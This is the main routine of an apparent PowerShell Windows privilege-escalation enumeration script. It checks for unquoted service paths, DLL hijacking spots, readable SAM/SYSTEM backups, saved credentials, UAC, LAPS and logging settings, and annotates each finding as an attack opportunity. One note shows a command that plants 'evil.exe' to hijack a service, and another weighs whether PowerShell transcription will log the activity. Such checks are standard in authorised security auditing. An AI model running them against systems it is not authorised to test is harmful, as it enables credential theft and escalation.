    "`n"

    "TEST: Checking for unquoted service paths..."
    "DESC: Can we hijack any service by planting a binary in one of the executable parent folders?"
    "NOTE: C:\APPS\Foo Bar\service.exe -> copy C:\Temp\evil.exe C:\APPS\Foo.exe"
    $Results = Invoke-ServicesUnquotedPathCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) result(s)"
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`n"

    "----------------------------------------------------------------"
    "|                         DLL HIJACKING                        |"
    "----------------------------------------------------------------"

    "TEST: Checking system %PATH% for potentially hijackable DLL locations..."
    "DESC: Do we have write permissions in at least one of the system %PATH% folders?"
    "NOTE: Show me the %PATH% to DLL hijacking."
    $Results = Invoke-DllHijackingCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) vulnerable path(s)."
        $Results | Format-List 
    } else {
        "[!] Nothing found."
    }

    "`n"

    "----------------------------------------------------------------"
    "|                        SENSITIVE FILES                       |"
    "----------------------------------------------------------------"

    "TEST: Checking SAM/SYSTEM files..."
    "DESC: Is there any backup of the SAM/SYSTEM hives we can read?"
    "NOTE: 'Some secrets are safer kept hidden...'"
    $Results = Invoke-SamBackupFilesCheck
    if ($Results) {
        "[+] Found $() readable file(s)."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }

    "`n"

    "----------------------------------------------------------------"
    "|                       INSTALLED PROGRAMS                     |"
    "----------------------------------------------------------------"
    
    "TEST: Listing non-default programs..."
    "DESC: Is there any non-default / third-party software we could exploit?"
    "NOTE: Again, security holes are often caused by third-party software."
    $Results = Invoke-InstalledProgramsCheck
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) non-default application(s)."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`n"
    
    "TEST: Checking modifiable programs..."
    "DESC: Do we have write permissions in non-default application folders?"
    "NOTE: If so, we may compromise other user accounts by planting a malicious EXE or DLL."
    $Results = Invoke-ModifiableProgramsCheck
    if ($Results) {
        "[+] Found $(([object[]]$Results).Length) file(s)."
        $Results | Format-Table
    } else {
        "[!] Nothing found."
    }

    "`n"

    "TEST: Listing processes..."
    "DESC: Among the processes that are not owned by the current user, is there anything interesting?"
    "NOTE: In this check, typical windows processes such as 'svchost' are filtered out."
    $Results = Invoke-RunningProcessCheck
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) process(es)."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`n"

    "----------------------------------------------------------------"
    "|                          CREDENTIALS                         |"
    "----------------------------------------------------------------"

    "TEST: Checking WinLogon registry key..."
    "DESC: Does the Winlogon registry key contain any cleartext password?"
    "NOTE: Quite unusual configuration, but you never know..."
    $Results = Invoke-WinlogonCheck
    if ($Results) {
        "[*] Found some info:"
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`n"

    "TEST: Checking Credential files..."
    "DESC: Does the current user have any saved credentials?"
    "NOTE: Saved credentials are actually stored as files in the current user's home folder."
    $Results = Invoke-CredentialFilesCheck
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) file(s)."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`n"

    "----------------------------------------------------------------"
    "|                       REGISTRY SETTINGS                      |"
    "----------------------------------------------------------------"

    "TEST: Checking UAC settings..."
    "DESC: Is User Access Control enabled?"
    "NOTE: If so, we may have to use a UAC bypass `"exploit`"."
    $Results = Invoke-UacCheck
    if ($Results) {
        "[*] UAC status:"
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }
    
    "`n"

    "TEST: Checking LSA RunAsPPL..."
    "DESC: Is lsass running as a Protected Process?"
    "NOTE: If Secure Boot or UEFI, RunAsPPL cannot be disabled by deleting the registry key."
    $Results = Invoke-LsaProtectionsCheck
    if ($Results) {
        "[*] Found some info."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`n"

    "TEST: Checking LAPS settings..."
    "DESC: Is the `"Local Administrator Password Solution`" enabled?"
    "NOTE: Even if we can extract the local admin password/hash, we might not be able to replay it on other machines."
    $Results = Invoke-LapsCheck
    if ($Results) {
        "[*] LAPS status:"
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }
    
    "`n"

    "TEST: Checking PowerShell Transcription settings..."
    "DESC: Is PowerShell Transcription enabled or even configured?"
    "NOTE: If so, everything we do in PowerShell is logged into a file." 
    $Results = Invoke-PowershellTranscriptionCheck
    if ($Results) {
        "[*] PowerShell Transcription is configured (and enabled?)."
        $Results | Format-List
    } else {
        "[!] Nothing found."
    }
    
    "`n"

    "TEST: Checking AlwaysInstallElevated registry key..."
    "DESC: Is the 'AlwaysInstallElevated' registry key enabled?"
    "NOTE: If so, we might be able to run an MSI file as SYSTEM."
    $Results = Invoke-RegistryAlwaysInstallElevatedCheck
    if ($Results) {
        "[+] AlwaysInstallElevated is enabled."
        $Result | Format-List
    } else {
        "[!] Nothing found."
    }
    
    "`n"

    "----------------------------------------------------------------"
    "|                           NETWORK                            |"
    "----------------------------------------------------------------"

    "TEST: Checking TCP endpoints..."
    "DESC: Is there any interesting/unusual service?"
    "NOTE: The quieter you become, ..."
    $Results = Invoke-TcpEndpointsCheck -Filtered
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) TCP endpoints."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`n"

    "TEST: Checking UDP endpoints..."
    "DESC: Is there any interesting/unusual service?"
    "NOTE: ...the more you are able to hear."
    $Results = Invoke-UdpEndpointsCheck -Filtered
    if ($Results) {
        "[*] Found $(([object[]]$Results).Length) UDP endpoints."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`n"

    "----------------------------------------------------------------"
    "|                             MISC                             |"
    "----------------------------------------------------------------"

    "TEST: Checking last Windows Update installation date..."
    "DESC: Has the OS been updated lately?"
    "NOTE: If the last update is more than 1 month old, we might be able to use some public exploits."
    $Results = Invoke-WindowsUpdateCheck 
    if ($Results) {
        "[*] Last update time:"
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`n"

    "TEST: Checking system version..."
    "DESC: What is the exact version number of the system?"
    "NOTE: If we can't get the last system update date and time, this can be useful."
    $Results = Invoke-SystemInfoCheck
    if ($Results) {
        "[*] Found some info."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`n"

    "TEST: Checking local admin group..."
    "DESC: Who is a member of the local administator group?"
    "NOTE: It's useful to know which user account we can try to compromise next."
    $Results = Invoke-LocalAdminGroupCheck
    if (([object[]]$Results).Length -gt 0) {
        "[*] The default local admin group has $(([object[]]$Results).Length) member(s)."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }
    
    "`n"

    "TEST: Checking machine role..."
    "DESC: Is it a Workstation / Server / Domain Controller?"
    "NOTE: Not the most useful piece of information, but eh, it doesn't hurt."
    $Results = Invoke-MachineRoleCheck 
    if ($Results) {
        "[*] Found some info."
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found"
    }

    "`n"

    "TEST: Checking system startup history..."
    "DESC: Can we extract the startup history from the Event Log?"
    "NOTE: If the machine is frequently rebooted, we could exploit services that can't be restarted manually."
    $Results = Invoke-SystemStartupHistoryCheck
    if (([object[]]$Results).Length -gt 0) {
        "[*] Found $(([object[]]$Results).Length) startup event(s) in the last 31 days."
        "[*] Last startup time was: $(([object[]]$Results)[0].Time)"
        $Results | Select-Object -First 10 | Format-Table
    } else {
        "[!] Nothing found."
    }

    "`n"

    "TEST: Checking last system startup..."
    "DESC: Can we calculate the last system startup date based on the current tick count?"
    "NOTE: We might not be able to get the system startup history from the Event Log but we can check the uptime."
    $Results = Invoke-SystemStartupCheck
    if ($Results) {
        "[*] Last startup event time:"
        $Results | Format-Table -AutoSize
    } else {
        "[!] Nothing found."
    }

    "`n"

    "TEST: Checking file system drives..."
    "DESC: Is there any other partition or mapped share?"
    "NOTE: It's quite common to see program folders configured with weak permissions on additional partitions."
    $Results = Invoke-SystemDrivesCheck
    "[*] Found $(([object[]]$Results).Length) drive(s)."
    $Results | Format-Table -AutoSize

    "`n"
}
#endregion Main